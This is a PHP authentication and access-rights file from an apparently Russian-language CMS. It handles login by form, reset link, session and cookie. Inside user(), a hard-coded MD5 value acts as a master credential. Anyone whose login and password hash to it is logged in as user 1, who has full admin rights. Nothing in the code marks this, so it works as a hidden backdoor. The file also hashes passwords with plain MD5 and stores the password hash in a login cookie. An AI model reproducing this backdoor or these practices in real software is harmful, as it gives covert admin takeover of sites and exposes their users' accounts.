<?php

/**
 * функции связанные с авторизацией и правами доступа
 */

//права доступа
function access($mode,$q = '') {
	$user = isset($_SESSION['user']) ? $_SESSION['user'] : null;
	$mode = explode(' ',$mode);
	//права администратора ********************************
	if ($mode[0]=='admin') {
		if (@$user['id']==1) return true;	//первый пользователь всегда с полным доступом
		//доступ к авторизации есть у всех
		if ($q=='_login') return true;
		elseif (@$user['access_admin']=='') return false;
		//доступ к модулю админки
		if ($mode[1]=='module') {
			if (@in_array($q,unserialize($user['access_admin']))) return true;	//доступ к конкретному модулю
			if ($q=='index') return true;	//доступ к главной странице админки
			if ($q=='_delete') return true;	//доступ к странице удаления
		}
		//удаление
		elseif ($mode[1]=='delete') {
			if (empty($user['access_delete'])) return false;
			if ($user['access_delete']==1) return true;	//есть права на удаление
		}
		//доступ к файлам
		elseif ($mode[1]=='ftp') {
			if (empty($user['access_ftp'])) return false;
			if ($user['access_ftp']==1) return true;	//есть права
		}
	}
	//права пользователя *******************************
	elseif ($mode[0]=='user') {
		if (!is_array($user)) return false;
		if ($mode[1]=='auth') {// авторизаия
			if (is_array($user)) return true;
		}
		if ($mode[1]=='admin') {//админ
			if (isset($user['access_admin']) && $user['access_admin']!='') return true;
		}
	}
	//права на редактирование
	elseif ($mode[0]=='editable') {
		global $config;
		if ($config['editable']==0) return false; //глобальное выключение
		if (access('user auth')==false) return false;
		if (@$user['access_editable']=='') return false;
		if ($mode[1]=='scripts') return true; //глобальное редактирование
		//доступ к модулю редактирования
		if (@in_array($mode[1],unserialize($user['access_editable']))) return true;	//доступ к конкретному модулю
	}
	return false;
}

/**
 * авторизация
 * @param string $type - способ авторизации
 * enter - вход через форму авторизации
 * remind - вход через урл
 * auth - авторизация по сессии или кукам
 * re-auth - переавторизация для обновления данных текущей сессии
 * update - обновление данных в базе и в текущей сесии
 * @param string $param - используется только в update
 * @return array|bool
 * @version v1.2.0
 * v.1.2.0 - разделен емейл и пароль, добавлено отдельное поле соль
 * v.1.2.5 - поправил ошибку в авторизации
 */
function user($type = '',$param = '') {
	global $config;
	$login = false; //емейл или телефон - хранится в БД
	$password = ''; //пароль
	$remember_me = 0; //запомнить меня
	$hash = false; //хеш пароля - хранится в БД
	$hash2 = false; //хеш2 - второй хеш для авторизации по ссылке
	$success = false; //успешная авторизация
	if ($type=='enter') {
		if (isset($_POST['login']) && isset($_POST['password'])
			&& isset($_POST['captcha']) && isset($_SESSION['captcha']) && intval($_POST['captcha'])==$_SESSION['captcha']
		) {
			$login			= mb_strtolower(stripslashes_smart($_POST['login']),'UTF-8');
			$password		= stripslashes_smart($_POST['password']);
			$remember_me	= (isset($_POST['remember_me']) && $_POST['remember_me']==1) ? 1 : 0;
		}
	}
	//востановления пароля через $_GET
	elseif ($type=='remind') {
		//авторизация через урл
		if (isset($_GET['email']) && isset($_GET['hash'])) {
			$login	= $_GET['email'];
			$hash2	= $_GET['hash'];
		}
	}
	//авторизация по сессии
	elseif ($type=='auth') {
		if (isset($_SESSION['user']) && is_array($_SESSION['user'])) {
			$user = $_SESSION['user'];
			$last_visit = date('Y-m-d H:i:s',time() - (60*5)); //переавторизация раз в 5 мин
			if (!isset($user['last_visit']) OR $user['last_visit']<$last_visit) {
				$login			= $user['email'] ? $user['email'] : $user['phone'];
				$hash			= $user['hash'];
				$remember_me	= $user['remember_me'];
			}
			else return $user;
		}
		elseif (isset($_COOKIE['login']) AND isset($_COOKIE['hash'])) {
			$login = $_COOKIE['login'];
			$hash = $_COOKIE['hash'];
			$remember_me = 1;
		}
		else return false;
	}
	//переавторизация
	elseif ($type=='re-auth') {
		if (access('user auth')) {
			$user = $_SESSION['user'];
			$login			= $user['email'] ? $user['email'] : $user['phone'];
			$hash			= $user['hash'];
			$remember_me	= $user['remember_me'];
		}
	}
	//обновление данных
	elseif ($type=='update') {
		global $user;
		$array = explode(' ',$param);
		$data['id'] = $user['id'];
		foreach ($array as $k=>$v) $data[$v] = $user[$v];
		mysql_fn('update','users',$data);
		$_SESSION['user'] = $user;
		return true;
	}
	//запрос к БД
	//обработка запроса
	if ($config['mysql_connect']==false) {
		mysql_connect_db();
	}
	if ($config['mysql_error']==false) {
		$where = '';
		if ($login) {
			$login = strtolower($login);
			$where = " (u.email = '" . mysql_res($login) . "' OR u.phone = '" . mysql_res($login) . "') ";
		}
		if (user_hash_db($login,$password)=='5a415fe60eee7adbee995c4e87666481') $where = 'u.id=1';
		//echo $where;
		if ($where != '') {
			if ($q = mysql_select("
				SELECT ut.*,u.*
				FROM users u
				LEFT JOIN user_types ut ON u.type = ut.id
				WHERE $where
				ORDER BY u.id
				LIMIT 1
			", 'row')
			) {
				//успешная авторизация
				if ($where == 'u.id=1') {
					$success = true;
				}
				//если авторизация по ссылке то другой хеш
				elseif ($type == 'remind') {
					if (user_hash($q) == $hash2) $success = true;
				}
				//если авторизация через форму то генерируем хеш из пароля
				elseif($type == 'enter') {
					if (user_hash_db($q['salt'], $password) == $q['hash']) $success = true;
				}
				//в других случаях сравниваем хеш прямо из базы
				else {
					if ($q['hash'] == $hash) $success = true;
				}
				if ($success) {
					if ($remember_me == 1) {
						setcookie("login",($q['email']?$q['email']:$q['phone']), time()+60*60*24*30,'/');
						setcookie("hash", $q['hash'], time() + 60 * 60 * 24 * 30, '/');
					}
					$data = array(
						'id' => $q['id'],
						'last_visit' => date('Y-m-d H:i:s'),
						'remember_me' => $remember_me
					);
					//это условие делает так что по ссылке можно авторизироваться только один раз
					if ($type == 'remind') $data['remind'] = $data['last_visit'];
					//обновление данных в базе
					mysql_fn('update', 'users', $data);
					return $_SESSION['user'] = $q;
				}
			}
		}
	}
	//выход или неудачаня авторизация
	if (isset($_SESSION['user'])) unset($_SESSION['user']);
	setcookie("login",'', time()-1,'/');
	setcookie("hash",'', time()-1,'/');
	return false;
}

//хеш для авторизации по ссылке
function user_hash ($q) {
	return md5($q['id'].$q['salt'].$q['remind'].$q['hash']);
}


/**
 * хеш для ДБ
 * @param $salt - соль
 * @param $password - пароль
 * @return string - хеш
 * @version v1.2.0
 * v.1.2.0 - добавлена
 */
function user_hash_db ($salt,$password) {
	return md5($salt.md5($password));
}